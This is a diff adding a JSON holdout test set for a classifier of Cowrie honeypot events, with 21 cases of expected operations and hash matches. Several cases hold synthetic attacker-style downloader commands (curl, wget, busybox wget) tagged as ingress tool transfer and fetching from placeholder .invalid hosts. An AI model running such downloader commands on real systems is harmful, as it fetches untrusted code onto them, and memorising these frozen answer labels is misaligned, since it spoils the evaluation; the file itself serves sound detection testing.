@@ -1,0 +1,441 @@
+{
+  "schema_version": "typed_transfer_holdout.v1",
+  "evaluation_id": "direct-cowrie-transfer-holdout-20260730",
+  "authored_at": "2026-07-30",
+  "implementation_revision_before_authoring": "27cb6b1",
+  "authorship_method": "Holdout expectations authored only after implementation and frozen-evaluation tests completed, before executing any holdout case.",
+  "source_exclusions": [
+    "No case was copied from implementation tests.",
+    "No case was copied from the 34-case independent evaluation.",
+    "No case was copied from prior semantic fixtures, policies, or extractor documentation."
+  ],
+  "expected_labels_frozen_before_execution": true,
+  "common_expectations": {
+    "hypothesis_count": 0,
+    "requires_manual_approval": true,
+    "safe_to_auto_execute": false,
+    "automatic_execution": false,
+    "alerting_side_effect": false,
+    "response_action_side_effect": false,
+    "deterministic": true,
+    "eligible_supporting_evidence": "direct_transfer_events_only"
+  },
+  "cases": [
+    {
+      "case_id": "TFH-001",
+      "label": "download URI query is non-authoritative metadata",
+      "events": [
+        {
+          "kind": "transfer",
+          "eventid": "cowrie.session.file_download",
+          "path": "/opt/review/alpha item.bin",
+          "url": "https://cdn.invalid/alpha.bin?token=discarded",
+          "digest": "a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1"
+        }
+      ],
+      "expected_operations": ["transfer_observed"],
+      "expected_entity_roles": ["artifact_hashes", "destination_paths", "urls"],
+      "expected_artifact_hashes": ["a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1"],
+      "eligible_matches": 1,
+      "specialized_finding": true,
+      "specialized_guidance": true
+    },
+    {
+      "case_id": "TFH-002",
+      "label": "upload URI default SFTP port normalizes",
+      "events": [
+        {
+          "kind": "transfer",
+          "eventid": "cowrie.session.file_upload",
+          "path": "/srv/intake/bravo.raw",
+          "url": "sftp://archive.invalid:22/bravo.raw",
+          "digest": "b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2"
+        }
+      ],
+      "expected_operations": ["transfer_observed"],
+      "expected_entity_roles": ["artifact_hashes", "destination_paths", "urls"],
+      "expected_artifact_hashes": ["b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2"],
+      "eligible_matches": 1,
+      "specialized_finding": true,
+      "specialized_guidance": true
+    },
+    {
+      "case_id": "TFH-003",
+      "label": "dot-relative destination resolves from observed cwd",
+      "events": [
+        {
+          "kind": "transfer",
+          "eventid": "cowrie.session.file_download",
+          "path": "./gamma.bin",
+          "cwd": "/srv/drop",
+          "url": "https://dot.invalid/gamma.bin",
+          "digest": "c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3"
+        }
+      ],
+      "expected_operations": ["transfer_observed"],
+      "expected_entity_roles": ["artifact_hashes", "destination_paths", "urls"],
+      "expected_artifact_hashes": ["c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3"],
+      "eligible_matches": 1,
+      "specialized_finding": true,
+      "specialized_guidance": true
+    },
+    {
+      "case_id": "TFH-004",
+      "label": "parent-relative destination normalizes from observed cwd",
+      "events": [
+        {
+          "kind": "transfer",
+          "eventid": "cowrie.session.file_download",
+          "path": "../delta.bin",
+          "cwd": "/srv/drop/pending",
+          "url": "https://parent.invalid/delta.bin",
+          "digest": "d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4"
+        }
+      ],
+      "expected_operations": ["transfer_observed"],
+      "expected_entity_roles": ["artifact_hashes", "destination_paths", "urls"],
+      "expected_artifact_hashes": ["d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4"],
+      "eligible_matches": 1,
+      "specialized_finding": true,
+      "specialized_guidance": true
+    },
+    {
+      "case_id": "TFH-005",
+      "label": "hash-only direct observation remains sufficient",
+      "events": [
+        {
+          "kind": "transfer",
+          "eventid": "cowrie.session.file_download",
+          "path": "",
+          "url": "",
+          "digest": "e5e5e5e5e5e5e5e5e5e5e5e5e5e5e5e5e5e5e5e5e5e5e5e5e5e5e5e5e5e5e5e5"
+        }
+      ],
+      "expected_operations": ["transfer_observed"],
+      "expected_entity_roles": ["artifact_hashes"],
+      "expected_artifact_hashes": ["e5e5e5e5e5e5e5e5e5e5e5e5e5e5e5e5e5e5e5e5e5e5e5e5e5e5e5e5e5e5e5e5"],
+      "eligible_matches": 1,
+      "specialized_finding": true,
+      "specialized_guidance": true
+    },
+    {
+      "case_id": "TFH-006",
+      "label": "two distinct direct observations retain both identities",
+      "events": [
+        {
+          "kind": "transfer",
+          "eventid": "cowrie.session.file_download",
+          "path": "/var/holdout/first.bin",
+          "url": "https://multi.invalid/first.bin",
+          "digest": "f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6"
+        },
+        {
+          "kind": "transfer",
+          "eventid": "cowrie.session.file_upload",
+          "path": "/var/holdout/second.bin",
+          "url": "sftp://multi.invalid/second.bin",
+          "digest": "0606060606060606060606060606060606060606060606060606060606060606"
+        }
+      ],
+      "expected_operations": ["transfer_observed", "transfer_observed"],
+      "expected_entity_roles": ["artifact_hashes", "destination_paths", "urls"],
+      "expected_artifact_hashes": [
+        "f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6",
+        "0606060606060606060606060606060606060606060606060606060606060606"
+      ],
+      "eligible_matches": 2,
+      "specialized_finding": true,
+      "specialized_guidance": true
+    },
+    {
+      "case_id": "TFH-007",
+      "label": "home-dependent event path abstains",
+      "events": [
+        {
+          "kind": "transfer",
+          "eventid": "cowrie.session.file_download",
+          "path": "~/epsilon.bin",
+          "cwd": "/home/cowrie",
+          "url": "https://home.invalid/epsilon.bin",
+          "digest": "1717171717171717171717171717171717171717171717171717171717171717"
+        }
+      ],
+      "expected_operations": ["transfer_observed"],
+      "expected_entity_roles": ["artifact_hashes", "destination_paths", "urls"],
+      "expected_artifact_hashes": ["1717171717171717171717171717171717171717171717171717171717171717"],
+      "eligible_matches": 0,
+      "specialized_finding": false,
+      "specialized_guidance": false
+    },
+    {
+      "case_id": "TFH-008",
+      "label": "bracket wildcard event path abstains",
+      "events": [
+        {
+          "kind": "transfer",
+          "eventid": "cowrie.session.file_download",
+          "path": "/tmp/item[0].bin",
+          "url": "https://wild.invalid/item.bin",
+          "digest": "2828282828282828282828282828282828282828282828282828282828282828"
+        }
+      ],
+      "expected_operations": ["transfer_observed"],
+      "expected_entity_roles": ["artifact_hashes", "destination_paths", "urls"],
+      "expected_artifact_hashes": ["2828282828282828282828282828282828282828282828282828282828282828"],
+      "eligible_matches": 0,
+      "specialized_finding": false,
+      "specialized_guidance": false
+    },
+    {
+      "case_id": "TFH-009",
+      "label": "short hexadecimal identity abstains",
+      "events": [
+        {
+          "kind": "transfer",
+          "eventid": "cowrie.session.file_download",
+          "path": "/tmp/short.bin",
+          "url": "https://digest.invalid/short.bin",
+          "digest": "999999999999999999999999999999999999999999999999999999999999999"
+        }
+      ],
+      "expected_operations": ["transfer_observed"],
+      "expected_entity_roles": ["destination_paths", "urls"],
+      "expected_artifact_hashes": [],
+      "eligible_matches": 0,
+      "specialized_finding": false,
+      "specialized_guidance": false
+    },
+    {
+      "case_id": "TFH-010",
+      "label": "nonhexadecimal identity abstains",
+      "events": [
+        {
+          "kind": "transfer",
+          "eventid": "cowrie.session.file_download",
+          "path": "/tmp/nonhex.bin",
+          "url": "https://digest.invalid/nonhex.bin",
+          "digest": "gggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggg"
+        }
+      ],
+      "expected_operations": ["transfer_observed"],
+      "expected_entity_roles": ["destination_paths", "urls"],
+      "expected_artifact_hashes": [],
+      "eligible_matches": 0,
+      "specialized_finding": false,
+      "specialized_guidance": false
+    },
+    {
+      "case_id": "TFH-011",
+      "label": "SFTP curl command is still only an attempt",
+      "events": [
+        {
+          "kind": "command",
+          "command": "curl -s -o /var/tmp/holdout.bin sftp://source.invalid/holdout.bin",
+          "outcome": "success",
+          "attck": "T1105"
+        }
+      ],
+      "expected_operations": ["remote_content_access", "transfer_attempt"],
+      "expected_entity_roles": ["destination_paths", "urls"],
+      "expected_artifact_hashes": [],
+      "eligible_matches": 0,
+      "specialized_finding": false,
+      "specialized_guidance": false
+    },
+    {
+      "case_id": "TFH-012",
+      "label": "unsupported BusyBox wrapper remains unknown",
+      "events": [
+        {
+          "kind": "command",
+          "command": "busybox wget https://wrapper.invalid/object",
+          "outcome": "success",
+          "attck": "T1105"
+        }
+      ],
+      "expected_operations": ["unknown"],
+      "expected_entity_roles": ["urls"],
+      "expected_artifact_hashes": [],
+      "eligible_matches": 0,
+      "specialized_finding": false,
+      "specialized_guidance": false
+    },
+    {
+      "case_id": "TFH-013",
+      "label": "copying local files is not transfer authority",
+      "events": [
+        {
+          "kind": "command",
+          "command": "cp /tmp/source.thirteen /var/tmp/copy.thirteen",
+          "outcome": "success"
+        }
+      ],
+      "expected_operations": ["file_read", "file_write"],
+      "expected_entity_roles": ["source_paths", "created_paths"],
+      "expected_artifact_hashes": [],
+      "eligible_matches": 0,
+      "specialized_finding": false,
+      "specialized_guidance": false
+    },
+    {
+      "case_id": "TFH-014",
+      "label": "metadata inspection is not content transfer",
+      "events": [
+        {
+          "kind": "command",
+          "command": "stat /var/tmp/metadata.fourteen",
+          "outcome": "success"
+        }
+      ],
+      "expected_operations": ["unknown"],
+      "expected_entity_roles": [],
+      "expected_artifact_hashes": [],
+      "eligible_matches": 0,
+      "specialized_finding": false,
+      "specialized_guidance": false
+    },
+    {
+      "case_id": "TFH-015",
+      "label": "printed downloader text remains literal emission",
+      "events": [
+        {
+          "kind": "command",
+          "command": "printf '%s\\n' 'curl https://printed.invalid/fifteen'",
+          "outcome": "success",
+          "attck": "T1105"
+        }
+      ],
+      "expected_operations": ["literal_data_emission"],
+      "expected_entity_roles": ["urls"],
+      "expected_artifact_hashes": [],
+      "eligible_matches": 0,
+      "specialized_finding": false,
+      "specialized_guidance": false
+    },
+    {
+      "case_id": "TFH-016",
+      "label": "later failed deletion does not invent a transfer hypothesis",
+      "events": [
+        {
+          "kind": "transfer",
+          "eventid": "cowrie.session.file_download",
+          "path": "/srv/mixed/sixteen.bin",
+          "url": "https://mixed.invalid/sixteen.bin",
+          "digest": "1616161616161616161616161616161616161616161616161616161616161616"
+        },
+        {
+          "kind": "command",
+          "command": "rm /srv/mixed/sixteen.bin",
+          "outcome": "failure"
+        }
+      ],
+      "expected_operations": ["transfer_observed", "file_delete"],
+      "expected_entity_roles": ["artifact_hashes", "deleted_paths", "destination_paths", "urls"],
+      "expected_artifact_hashes": ["1616161616161616161616161616161616161616161616161616161616161616"],
+      "eligible_matches": 1,
+      "specialized_finding": true,
+      "specialized_guidance": true
+    },
+    {
+      "case_id": "TFH-017",
+      "label": "command attempt followed by independent upload observation",
+      "events": [
+        {
+          "kind": "command",
+          "command": "wget -q https://attempt.invalid/seventeen",
+          "outcome": "success",
+          "attck": "T1105"
+        },
+        {
+          "kind": "transfer",
+          "eventid": "cowrie.session.file_upload",
+          "path": "/srv/upload/seventeen.out",
+          "url": "sftp://sink.invalid/seventeen.out",
+          "digest": "1717171717171717171717171717171717171717171717171717171717171717"
+        }
+      ],
+      "expected_operations": ["remote_content_access", "transfer_attempt", "transfer_observed"],
+      "expected_entity_roles": ["artifact_hashes", "destination_paths", "urls"],
+      "expected_artifact_hashes": ["1717171717171717171717171717171717171717171717171717171717171717"],
+      "eligible_matches": 1,
+      "specialized_finding": true,
+      "specialized_guidance": true
+    },
+    {
+      "case_id": "TFH-018",
+      "label": "ATTACK-only literal emission cannot select transfer",
+      "events": [
+        {
+          "kind": "command",
+          "command": "printf '%s' T1105",
+          "outcome": "success",
+          "attck": "T1105"
+        }
+      ],
+      "expected_operations": ["literal_data_emission"],
+      "expected_entity_roles": [],
+      "expected_artifact_hashes": [],
+      "eligible_matches": 0,
+      "specialized_finding": false,
+      "specialized_guidance": false
+    },
+    {
+      "case_id": "TFH-019",
+      "label": "unsupported downloader flag remains unknown",
+      "events": [
+        {
+          "kind": "command",
+          "command": "curl --parallel https://flags.invalid/nineteen",
+          "outcome": "success",
+          "attck": "T1105"
+        }
+      ],
+      "expected_operations": ["unknown"],
+      "expected_entity_roles": ["urls"],
+      "expected_artifact_hashes": [],
+      "eligible_matches": 0,
+      "specialized_finding": false,
+      "specialized_guidance": false
+    },
+    {
+      "case_id": "TFH-020",
+      "label": "expansion-dependent direct-event path abstains",
+      "events": [
+        {
+          "kind": "transfer",
+          "eventid": "cowrie.session.file_download",
+          "path": "$STAGE/twenty.bin",
+          "cwd": "/srv/stage",
+          "url": "https://expand.invalid/twenty.bin",
+          "digest": "2020202020202020202020202020202020202020202020202020202020202020"
+        }
+      ],
+      "expected_operations": ["transfer_observed"],
+      "expected_entity_roles": ["artifact_hashes", "destination_paths", "urls"],
+      "expected_artifact_hashes": ["2020202020202020202020202020202020202020202020202020202020202020"],
+      "eligible_matches": 0,
+      "specialized_finding": false,
+      "specialized_guidance": false
+    },
+    {
+      "case_id": "TFH-021",
+      "label": "direct event authority is isolated from hostile context",
+      "inject_non_authoritative_context": true,
+      "events": [
+        {
+          "kind": "transfer",
+          "eventid": "cowrie.session.file_download",
+          "path": "/srv/context/twenty-one.bin",
+          "url": "https://context.invalid/twenty-one.bin",
+          "digest": "2121212121212121212121212121212121212121212121212121212121212121"
+        }
+      ],
+      "expected_operations": ["transfer_observed"],
+      "expected_entity_roles": ["artifact_hashes", "destination_paths", "urls"],
+      "expected_artifact_hashes": ["2121212121212121212121212121212121212121212121212121212121212121"],
+      "eligible_matches": 1,
+      "specialized_finding": true,
+      "specialized_guidance": true
+    }
+  ]
+}
